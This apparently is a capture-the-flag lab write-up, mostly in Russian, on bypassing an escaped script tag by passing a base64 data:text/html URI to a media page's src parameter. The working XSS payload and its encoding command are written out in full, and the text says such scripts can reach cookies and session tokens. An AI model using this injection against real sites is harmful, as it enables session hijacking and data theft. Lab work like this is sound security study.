The data uri scheme, mime types and xss

http://192.168.56.110/index.php?page=media&src=nsa

Вместо nsa пробуем вставить рисунок получаем:
http://192.168.56.110/?page=media&src=/images/nsa.png

Вместо nsa пробуем вставить js скрипт получаем Sorry Wrong Answre:
192.168.56.110/?page=media&src=<script>alert("hello!");</script>
Если мы посмотрим Page source то можем заметить что 
<object data="<script>alert(&quot;hello!&quot;);</script>"></object>

Оказывается, мы можем использовать base64 для кодирования нашего скрипта в javascript

согласно статье в Википедии :

https://en.wikipedia.org/wiki/Data_URI_scheme
Синтаксис URI данных был определен в RFC 2397, опубликованном в августе 1998 г. [5], и следует синтаксису схемы URI. URI data состоит из:
data:[<media type>][;base64],<data>
данные: [<тип носителя>][; base64],<данные>

Через терминал находим кодировку base64
echo -n '<script>alert("hello");</script>' | base64 
PHNjcmlwdD5hbGVydCgiaGVsbG8iKTs8L3NjcmlwdD4=

или на сайте 
https://base64.guru/converter/encode
<script>alert("hello");</script>
PHNjcmlwdD5hbGVydCgiaGVsbG8iKTs8L3NjcmlwdD4=

Вставляем base64 согласно формата в строку поиска и находим флаг

http://192.168.56.110/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGVsbG8iKTs8L3NjcmlwdD4=


вредоносный скрипт может получить доступ к любым файлам cookie, токенам сеанса или другой конфиденциальной информации, сохраненной браузером и используемой на этом сайте.

Рекомендации 

https://owasp.org/www-community/attacks/xss/


